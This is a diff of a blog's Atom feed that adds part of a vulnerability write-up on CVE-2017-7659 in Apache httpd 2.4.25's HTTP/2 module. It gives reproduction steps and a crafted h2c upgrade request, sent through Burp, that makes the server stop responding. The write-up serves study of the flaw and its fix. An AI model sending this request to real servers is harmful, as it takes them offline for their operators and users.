@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2017-07-18T11:02:54-05:00</updated>
+  <updated>2017-07-18T11:20:09-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -28,6 +28,44 @@
 <p><code>https://github.com/apache/httpd/commit/672187c168b94b562d8065e08e2cad5b00cdd0e3</code></p>
 
 <p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2017_7659/Capture1.PNG" title="[title manually exploit [alt text]]" ></p>
+
+<p>As we can see, fix just add check return value of function h2_request_rcreate.</p>
+
+<h2>reproduce:</h2>
+
+<p>First, download apache version 2.4.25: <a href="https://archive.apache.org/dist/httpd/httpd-2.4.25.tar.gz.">https://archive.apache.org/dist/httpd/httpd-2.4.25.tar.gz.</a> compile it and enable http2. I wrote a bash script to do download and configure it. After that use curl to verify if http2 is ready to go</p>
+
+<p><code>curl -v --http2 http://192.168.79.136</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2017_7659/Capture2.PNG" title="[title manually exploit [alt text]]" ></p>
+
+<p>when you see HTTP/1.1 101 Switching Protocols, that means http2 is good to go.</p>
+
+<p>now in burp send http request:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>GET / HTTP/1.0
+</span><span class='line'>User-Agent: curl/7.47.0
+</span><span class='line'>Accept: */*
+</span><span class='line'>Connection: Upgrade, HTTP2-Settings
+</span><span class='line'>Upgrade: h2c
+</span><span class='line'>HTTP2-Settings: AAMAAABkAAQAAP__</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2017_7659/Capture3.PNG" title="[title manually exploit [alt text]]" ></p>
+
+<p>The server doesn&rsquo;t response.</p>
+
+<h2>Analysis</h2>
+
+<p>First check vulnerable function h2_stream_set_request_rec (in httpd-2.4.25/modules/http2/h2_stream.c)</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulnerability/cve_2017_7659/Capture4.PNG" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
   </entry>
   
